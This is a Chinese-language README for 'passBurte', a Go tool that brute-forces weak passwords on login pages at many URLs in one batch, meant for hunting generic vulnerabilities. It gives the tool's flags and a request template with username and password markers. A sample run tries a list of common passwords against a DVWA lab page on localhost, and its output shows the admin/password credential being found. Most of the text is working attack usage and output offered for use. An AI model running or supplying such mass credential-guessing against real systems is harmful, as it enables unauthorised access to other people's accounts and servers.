# passBurte
小工具   一个用于通用漏洞挖掘时批量爆破弱口令的工具

在挖掘通用漏洞时,有些时候需要获取后台密码,我们可以导入url列表进行批量爆破

这是根据自己的需求写的小工具

# 使用方法
### 参数
    使用 -h 显示帮助信息
        -charset string      编码方式                                      
        -hash string         密码md5 或 base64,暂只支持md5/base64                                      
        -links string        爆破IP地址文件 (default "links.txt")          
        -passwd string       爆破密码,使用逗号隔开 (default "123456,admin")
        -perr string         密码错误提示，使用正则表达式                  
        -psuc string         密码正确提示，使用正则表达式                  
        -src string          数据包 (default "1.txt")                      
        -success             是否只显示成功的数据                          
        -time-sec float      设置请求间隔，单位秒                          
        -user string         爆破账号                                      
        -viewerr             是否显示报错信息,默认关闭                              
        -viewresp            是否显示响应数据,默认显示
    
### 使用
复制请求的http数据包到`1.txt`中,设置好账号和密码标记.

使用`^USER^`标记用户名,使用`^PASS^` 标记密码

    GET /vulnerabilities/brute/?username=^USER^&password=^PASS^&Login=Login HTTP/1.1
    Host: 127.0.0.1
    sec-ch-ua: "Chromium";v="105", "Not)A;Brand";v="8"
    sec-ch-ua-mobile: ?0
    sec-ch-ua-platform: "Windows"
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.127 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
    Sec-Fetch-Site: same-origin
    Sec-Fetch-Mode: navigate
    Sec-Fetch-User: ?1
    Sec-Fetch-Dest: document
    Referer: http://127.0.0.1/vulnerabilities/brute/
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Cookie: Hm_lvt_520556228c0113270c0c772027905838=1668054376; PHPSESSID=1t4lik619631cpu1gqddsac8lj; security=low
    Connection: close

复制请求地址到`links.txt`

    http://127.0.0.1/
    http://127.0.0.1/
    http://127.0.0.1/
    http://127.0.0.1/
    http://127.0.0.1/
    http://127.0.0.1/
    http://127.0.0.1/
    http://127.0.0.1/
    http://127.0.0.1/
    http://127.0.0.1/
    

设置好用于判断是否爆破成功的`perr`或`psuc`,以及是否进行密码的编码`hash`,响应包的编码`charset`等信息 即可开始批量爆破

perr 参数  在响应包中只有<font color=#FF000 >**密码错误**</font>才会有的关键字,可使用正则表达式

psuc 参数  在响应包中只有<font color=#FF000 >**密码正确**</font>才会有的关键字,可使用正则表达式

默认会显示响应消息,使用`-viewresp=false` 关闭

     go_build_passBurte.exe -user admin -passwd 123456,admin,admin123,password -psuc "Welcome to the password" -time-sec 1 -viewresp=false

输出结果:

    http 请求方法： GET
    错误提示：
    请求数据： username=^USER^&password=123456,admin,admin123,password&Login=Login
    http 请求头:
    Referer http://127.0.0.1/vulnerabilities/brute/
    sec-ch-ua "Chromium";v="105", "Not)A;Brand";v="8"
    User-Agent Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.127 Safari/537.36
    Sec-Fetch-User ?1
    Sec-Fetch-Dest document
    Cookie Hm_lvt_520556228c0113270c0c772027905838=1668054376; PHPSESSID=1t4lik619631cpu1gqddsac8lj; security=low
    sec-ch-ua-mobile ?0
    Accept text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
    Sec-Fetch-Site same-origin
    Accept-Encoding gzip, deflate
    Accept-Language zh-CN,zh;q=0.9
    Host 127.0.0.1
    sec-ch-ua-platform "Windows"
    Upgrade-Insecure-Requests 1
    Sec-Fetch-Mode navigate
    密码错误 http://127.0.0.1//vulnerabilities/brute/
    密码错误 http://127.0.0.1//vulnerabilities/brute/
    密码错误 http://127.0.0.1//vulnerabilities/brute/
    密码正确 http://127.0.0.1//vulnerabilities/brute/ data: username=admin&password=password&Login=Login
    密码错误 http://127.0.0.1//vulnerabilities/brute/
    密码错误 http://127.0.0.1//vulnerabilities/brute/
    密码错误 http://127.0.0.1//vulnerabilities/brute/
    密码正确 http://127.0.0.1//vulnerabilities/brute/ data: username=admin&password=password&Login=Login
    密码错误 http://127.0.0.1//vulnerabilities/brute/
    密码错误 http://127.0.0.1//vulnerabilities/brute/
    密码错误 http://127.0.0.1//vulnerabilities/brute/
    密码正确 http://127.0.0.1//vulnerabilities/brute/ data: username=admin&password=password&Login=Login
    密码错误 http://127.0.0.1//vulnerabilities/brute/
    密码错误 http://127.0.0.1//vulnerabilities/brute/
    密码错误 http://127.0.0.1//vulnerabilities/brute/
    密码正确 http://127.0.0.1//vulnerabilities/brute/ data: username=admin&password=password&Login=Login
    密码错误 http://127.0.0.1//vulnerabilities/brute/
    密码错误 http://127.0.0.1//vulnerabilities/brute/
    密码错误 http://127.0.0.1//vulnerabilities/brute/
    密码正确 http://127.0.0.1//vulnerabilities/brute/ data: username=admin&password=password&Login=Login
    密码错误 http://127.0.0.1//vulnerabilities/brute/
